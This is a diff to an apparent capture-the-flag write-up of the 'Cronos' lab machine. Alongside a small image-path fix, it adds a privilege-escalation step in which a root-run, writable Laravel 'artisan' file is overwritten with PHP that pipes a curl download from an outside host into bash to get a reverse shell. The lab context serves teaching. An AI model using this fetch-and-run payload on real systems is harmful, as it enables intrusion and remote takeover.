@@ -41,7 +41,7 @@ We got a domain, `cronos.htb`
 
 Let's add `cronos.htb` to our hosts file and attempt to browse to it:
 
-![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/browse2.png)
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/browser2.png)
 
 Running a gobuster scan:
 
@@ -107,6 +107,19 @@ The last line seems interesting... seems like artisan is being executed by root.
 
 Let's look at the permissions of `/var/www/laravel/artisan`:
 
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/artisan.png)
+
+We own the file, and are able to write to it.
+
+Editing artisan:
+
+
+~~~
+<?php
+system('curl http://10.10.10.14/script.sh | bash')
+?>
+
+This will download the php reverse shell 
 
 
 
